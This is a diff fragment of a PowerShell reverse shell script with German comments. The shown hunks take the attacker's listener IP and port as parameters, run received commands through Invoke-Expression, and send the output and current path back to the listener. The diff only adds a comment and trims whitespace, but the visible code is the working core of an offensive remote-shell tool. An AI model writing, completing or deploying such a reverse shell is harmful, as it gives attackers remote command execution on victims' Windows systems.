@@ -1,12 +1,13 @@
 # PowerShell-only Reverse Shell (keine cmd.exe, keine externen Tools)
 # Dieses Skript verbindet sich mit einem Listener und führt PowerShell-Befehle aus.
 # Enthält Reconnect-Logik und Logging.
+# New
 
 # --- KONFIGURATION START ---
 Param(
     [Parameter(Mandatory=$true)] # Macht die Angabe von -ip Pflicht
     [string]$ip,                 # IP-Adresse des Angreifers/Listeners
-    
+
     [Parameter(Mandatory=$true)] # Macht die Angabe von -port Pflicht
     [int]$port                   # Port des Listeners
 )
@@ -71,7 +72,7 @@ function Start-ReverseShell {
                     # Führe den Befehl aus und fange sowohl Standard-Output als auch Fehler ab
                     $output = Invoke-Expression $command 2>&1 | Out-String;
                     Write-Log "Command executed. Output length: $($output.Length)."
-                    
+
                     # Sende die Ausgabe zurück zum Listener
                     $sw.WriteLine($output + (Get-Location).Path + "> "); # Füge den aktuellen Pfad und Prompt hinzu
                     $sw.Flush();
